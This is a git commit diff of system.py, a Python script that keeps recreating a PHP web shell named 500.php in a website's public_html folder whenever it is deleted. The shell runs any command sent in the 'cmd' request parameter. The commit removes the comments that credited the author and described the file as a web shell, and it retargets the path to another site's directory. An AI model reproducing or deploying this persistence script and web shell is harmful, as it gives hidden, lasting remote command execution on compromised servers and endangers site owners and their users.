17508ace9ca24e387a54019d7825082ce578895f
dowengpakaiz <110327193+dowengpakaiz@users.noreply.github.com>
2022-09-05 04:01:26 +0700

    Update system.py

--- system.py
+++ system.py
@@ -1,13 +1,10 @@
-# auto create shell when shell get delete
-# coded by root@x-krypt0n-x
-# thanks to warwer jeager cracken
 import os
 import time
 import os.path
 
 def main():
     while True:
-        f = os.path.exists('/home/admin/web/vegansid.askwheel.com/public_html/500.php') # example # the path where you want to put the web shell
+        f = os.path.exists('/home/admin/web/dinneride.com/public_html/500.php')
         
         if f == True:
             print("[*] file exists")
@@ -17,9 +14,9 @@ def main():
         else:
             print("[!] file not found")
             print("[!] creating file")
-            # creating web shell 
-            a = open('/home/admin/web/vegansid.askwheel.com/public_html/500.php','a') # example # the path where you want to put the web shell
-            a.write('<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>') # u shell, example http://127.0.0.1/shell.php?cmd=ls -la (command)
+            
+            a = open('/home/admin/web/dinneride.com/public_html/500.php','a')
+            a.write('<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>')
             a.close()
             time.sleep(5)
 main()
